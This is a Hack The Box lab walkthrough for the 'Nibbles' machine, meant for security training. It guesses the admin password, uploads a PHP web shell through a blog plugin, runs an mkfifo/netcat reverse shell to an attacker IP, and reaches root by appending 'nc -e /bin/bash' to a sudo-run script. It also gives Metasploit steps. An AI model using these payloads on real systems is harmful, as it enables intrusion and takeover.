# Hack The Box - Nibbles Walkthrough

## Introduction
Nibbles is an easy-rated Linux machine on the Hack The Box platform. This machine demonstrates common enumeration tactics, basic web application exploitation, and a file-related misconfiguration for privilege escalation.

## Machine Information

| Details              | Information                  |
|----------------------|------------------------------|
| **Name**            | Nibbles                      |
| **Creator**         | mrb3n                        |
| **OS**              | Linux                        |
| **Difficulty**      | Easy                         |
| **User Path**       | Web                          |
| **Privilege Escalation** | Writable File / Sudo Misconfiguration |

## Attack Steps

### 1. Enumeration

Enumeration is a crucial phase of penetration testing. We use `nmap` to identify open ports and running services.

#### Initial Scan

```
nmap -sV --open -oA nibbles_initial_scan <IP-Target>
```

**Relevant Results:**

- Port 22 (SSH): OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- Port 80 (HTTP): Apache 2.4.18 (Ubuntu)

#### Full Scan

```
nmap -p- --open -oA nibbles_full_tcp_scan <IP-Target>
```

- No additional ports found.

#### Web Server Identification

Using `whatweb` to gather more information about the web server:

```
whatweb <IP-Target>
```

Key findings:

- Apache 2.4.18 (Ubuntu)
- No specific web technologies detected

Browsing the webpage reveals a simple *Hello World!* message. Examining the source code, we find an interesting comment:

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

This indicates the existence of a `/nibbleblog` directory.

### 2. Web Enumeration

Analyzing the `/nibbleblog` directory using `whatweb`:

```
whatweb http://<IP-Target>/nibbleblog
```

Findings:

- **Nibbleblog 4.0.3** is used, a PHP-based blogging platform.

#### Directory Bruteforcing with Gobuster

```
gobuster dir -u http://<IP-Target>/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

Results:

- `/admin.php` (admin panel)
- `/content/`
- `/themes/`
- `/plugins/`
- `/README`

The `/README` file confirms the version is **Nibbleblog v4.0.3**.

### 3. Gaining Admin Access

Investigating `/content/private/users.xml`, we find that the admin username is **admin**.

Trying the password **nibbles**, based on the machine’s name:

**admin:nibbles** → Login successful!

### 4. Exploitation - Remote Code Execution

#### Malicious File Upload

The admin panel has a *My Image* plugin allowing image uploads.

We attempt to upload a PHP file:

```
<?php system('id'); ?>
```

Upload is successful, and we locate our file at:

```
http://<IP-Target>/nibbleblog/content/private/plugins/my_image/shell.php
```

Verifying execution:

```
curl http://<IP-Target>/nibbleblog/content/private/plugins/my_image/shell.php
```

Output:
```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We have command execution!

#### Reverse Shell Execution

Modify the file `shell.php`:

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> 9001 >/tmp/f"); ?>
```

- Start a Netcat listener on the attack machine:

```
nc -lvnp 9001
```

- Execute the shell by visiting the file's URL.

Result: We obtain a shell as **nibbler**.

### 5. Privilege Escalation

#### Checking Sudo Permissions

```
sudo -l
```

Output:
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `monitor.sh` script is writable by nibbler and executable with `sudo`.

Appending a reverse shell to the script:

```
echo 'nc -e /bin/bash <ATTACKER-IP> 9002' >> /home/nibbler/personal/stuff/monitor.sh
```

- Start a new Netcat listener:

```
nc -lvnp 9002
```

- Execute the script with sudo:

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

We obtain a **root shell** 🎉

#### Confirming Root Access

```
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

The root flag is located in `/root/root.txt`.

### 6. Alternative Exploitation via Metasploit

Using **Metasploit** for automation:

```
msfconsole
use exploit/multi/http/nibbleblog_file_upload
set RHOSTS <IP-Target>
set LHOST <ATTACKER-IP>
set USERNAME admin
set PASSWORD nibbles
set TARGETURI nibbleblog
set payload generic/shell_reverse_tcp
exploit
```

We obtain a shell and follow the same privilege escalation process.

## Common Pitfalls

### VPN Issues

- Ensure VPN connection is active:
  ```
  sudo openvpn ./htb.ovpn
  ```
- Check VPN IP assignment:
  ```
  ip -4 a show tun0
  ```
- Verify routing:
  ```
  sudo netstat -rn
  ```
- Confirm access by pinging gateway:
  ```
  ping -c 4 10.10.14.1
  ```

### Burp Suite Proxy Issues

- Ensure Burp proxy is **disabled** when not in use to avoid connection issues.

### SSH Key and Password Issues

- Regenerate SSH keys if facing authentication problems:
  ```
  ssh-keygen
  ```

## Conclusion

We learned how to:

- Enumerate a target using `nmap`, `gobuster`, `whatweb`
- Identify weak credentials and gain admin access
- Exploit a vulnerable file upload to execute commands
- Obtain a reverse shell and escalate privileges
- Automate exploitation with Metasploit

